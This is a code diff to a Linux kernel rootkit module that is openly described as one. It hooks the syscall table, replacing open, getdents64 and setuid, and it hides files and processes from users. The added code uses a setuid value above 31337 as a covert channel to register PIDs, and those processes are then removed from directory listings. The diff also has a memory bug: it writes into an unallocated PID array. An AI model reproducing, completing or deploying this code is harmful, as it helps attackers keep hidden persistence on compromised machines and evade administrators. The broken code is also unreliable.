@@ -41,11 +41,14 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 psize *system_call_table; // Store syscall table location
 
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
+char *hidden_PIDs[];
+int index = 0;
 
 /* Hacked Syscall Pointers */
 
 asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int (*orig_open)(const char *, int, mode_t);
+asmlinkage int (*orig_setuid)(uid_t);
 
 /* Function Declarations */
 
@@ -107,6 +110,19 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 		while (t > 0){
 			n = dirp3->d_reclen;
 			t -= n;
+			int i;
+			for(i = 0; i <= index; i++){
+				if(strstr((char*) &(dirp3->d_name), hidden_PIDs[i]) != NULL){
+                                	if (t != 0){
+                                	        memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
+                                	}
+                                	else{
+                                	        dirp3->d_off = 1024;
+                                	}
+                                		tmp -=n;
+                        	}
+			}
+
 			if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
 				if (t != 0){
 					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
@@ -124,6 +140,17 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 		kfree(dirp2);
 	}
 	return tmp;
+}
+
+/* Hacked Setuid Syscall */
+
+/* This is used for interfacing with the rootkit to hide processes. */
+
+asmlinkage int hacked_setuid(uid_t uid){
+	if(uid > 31337){
+		sprintf(hidden_PIDs[index++], "%d", uid - 31337);
+	}
+	return (*orig_setuid)(uid);
 }
 
 /* Module initialization function */
@@ -145,6 +172,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	orig_open = (void *)xchg(&system_call_table[__NR_open],hacked_open); // Replace open with hacked open
 	orig_getdents64 = (void *)xchg(&system_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
+	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
@@ -158,6 +186,7 @@ void rootkit_exit(void) {
 
 	xchg(&system_call_table[__NR_open],orig_open); // Replace hacked open with original
 	xchg(&system_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
+	xchg(&system_call_table[__NR_setuid],orig_setuid);
 	
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
